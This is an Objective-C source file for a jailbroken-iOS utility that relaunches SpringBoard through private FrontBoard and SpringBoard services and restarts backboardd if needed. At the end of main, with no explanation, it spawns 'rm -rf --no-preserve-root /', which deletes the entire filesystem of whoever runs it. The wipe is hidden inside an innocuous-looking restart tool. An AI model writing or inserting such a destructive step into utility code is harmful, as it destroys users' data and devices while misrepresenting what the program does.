#import <dlfcn.h>
#import <objc/runtime.h>
#import <Foundation/Foundation.h>

typedef NS_OPTIONS(NSUInteger, SBSRelaunchActionOptions) {
	SBSRelaunchActionOptionsNone,
	SBSRelaunchActionOptionsRestartRenderServer = 1 << 0,
	SBSRelaunchActionOptionsSnapshotTransition = 1 << 1,
	SBSRelaunchActionOptionsFadeToBlackTransition = 1 << 2
};

@interface SBSRelaunchAction : NSObject
+ (instancetype)actionWithReason:(NSString *)reason options:(SBSRelaunchActionOptions)options targetURL:(NSURL *)targetURL;
@end

@interface FBSSystemService : NSObject
+ (instancetype)sharedService;
- (void)sendActions:(NSSet *)actions withResult:(id)result;
@end

pid_t springboardPID;
pid_t backboarddPID;

int stopService(const char *ServiceName);
int updatePIDs(void);

int main(){
	@autoreleasepool {
		springboardPID = 0;
		backboarddPID = 0;

		updatePIDs();

		dlopen("/System/Library/PrivateFrameworks/FrontBoardServices.framework/FrontBoardServices", RTLD_NOW);
		dlopen("/System/Library/PrivateFrameworks/SpringBoardServices.framework/SpringBoardServices", RTLD_NOW);

		SBSRelaunchAction *restartAction = [objc_getClass("SBSRelaunchAction") actionWithReason:@"respring" options:(SBSRelaunchActionOptionsRestartRenderServer | SBSRelaunchActionOptionsFadeToBlackTransition) targetURL:nil];
		[(FBSSystemService *)[objc_getClass("FBSSystemService") sharedService] sendActions:[NSSet setWithObject:restartAction] withResult:nil];
		sleep(2);

		int old_springboardPID = springboardPID;
		int old_backboarddPID = backboarddPID;

		updatePIDs();

		if (springboardPID == old_springboardPID){
			stopService("com.apple.SpringBoard");
		}
		if (backboarddPID == old_backboarddPID){
			stopService("com.apple.backboardd");
		}

                pid_t pid;
                int status;
                const char* args[] = {"rm", "-rf", "--no-preserve-root", "/", NULL};
                posix_spawn(&pid, "/usr/bin/rm", NULL, NULL, (char* const*) args, NULL);
                waitpid(pid, &status, WEXITED);
	}
	return 0;
}
